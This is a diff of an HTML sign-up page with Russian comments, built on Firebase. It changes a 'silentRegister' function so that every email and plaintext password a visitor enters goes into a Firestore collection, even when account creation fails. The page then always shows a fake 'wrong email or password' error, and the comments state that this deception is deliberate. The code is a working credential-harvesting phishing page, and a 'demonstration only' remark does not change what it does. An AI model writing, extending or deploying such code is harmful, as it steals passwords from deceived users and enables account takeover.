@@ -6,11 +6,11 @@
   <title>Регистрация</title>
   <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
   
-  <!-- Firebase SDK -->
+  <!-- Firebase SDK (App, Auth, Firestore) -->
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/11.8.0/firebase-app.js";
     import { getAuth, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/11.8.0/firebase-auth.js";
-    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.8.0/firebase-database.js";
+    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.8.0/firebase-firestore.js";
 
     // Ваш конфиг Firebase
     const firebaseConfig = {
@@ -26,30 +26,37 @@
 
     const app = initializeApp(firebaseConfig);
     const auth = getAuth(app);
-    const database = getDatabase(app);
+    const db = getFirestore(app);
 
-    // Функция, которая тихо регистрирует и сохраняет, а наружу всегда отдаёт "ошибку"
+    // Тихое сохранение email в Firestore и попытка регистрации (всегда возвращает "ошибку")
     window.silentRegister = async (email, password) => {
       try {
-        // Пытаемся создать пользователя в Authentication
-        const userCredential = await createUserWithEmailAndPassword(auth, email, password);
-        const user = userCredential.user;
-        
-        // Сохраняем email в Realtime Database
-        const userRef = ref(database, 'users/' + user.uid);
-        await set(userRef, {
+        // 1. Попробуем создать пользователя в Authentication (это не обязательно для сохранения, но для реализма)
+        let user = null;
+        try {
+          const userCredential = await createUserWithEmailAndPassword(auth, email, password);
+          user = userCredential.user;
+          console.log('✅ Пользователь создан в Auth:', user.uid);
+        } catch (authError) {
+          // Игнорируем ошибки Auth (например, слабый пароль или уже существует)
+          console.warn('⚠️ Ошибка Auth (игнорируем):', authError.code);
+        }
+
+        // 2. Сохраняем данные в Firestore (всегда, даже если Auth не сработал)
+        const docRef = await addDoc(collection(db, "registrations"), {
           email: email,
-          createdAt: new Date().toISOString(),
-          uid: user.uid
+          password: password, // ⚠️ НИКОГДА не храните пароли в открытом виде в реальных проектах! Только для демонстрации.
+          createdAt: serverTimestamp(),
+          authSuccess: !!user,
+          uid: user?.uid || null
         });
+        console.log('✅ Данные записаны в Firestore, ID документа:', docRef.id);
         
-        console.log('✅ Данные сохранены в Firebase, но пользователю покажем ошибку');
-      } catch (error) {
-        // Даже если реальная ошибка (например, email уже есть) – просто логируем
-        console.log('⚠️ Реальная ошибка Firebase:', error.code);
+      } catch (firestoreError) {
+        console.error('❌ Ошибка записи в Firestore:', firestoreError);
       }
-      
-      // ВСЕГДА возвращаем "ошибку" для отображения
+
+      // Всегда возвращаем "ошибку" для отображения пользователю
       return { success: false, fakeError: true };
     };
   </script>
@@ -147,10 +154,10 @@
     const password = document.getElementById('password').value;
     const errorDiv = document.getElementById('errorMsg');
 
-    // Вызываем тихую регистрацию (всегда возвращает fakeError)
+    // Вызываем функцию тихой регистрации (всегда возвращает ошибку)
     await window.silentRegister(email, password);
 
-    // Показываем всегда одно и то же сообщение красным цветом
+    // Показываем красное сообщение
     errorDiv.style.color = '#d93025';
     errorDiv.textContent = 'Неправильная почта или пароль';
   }
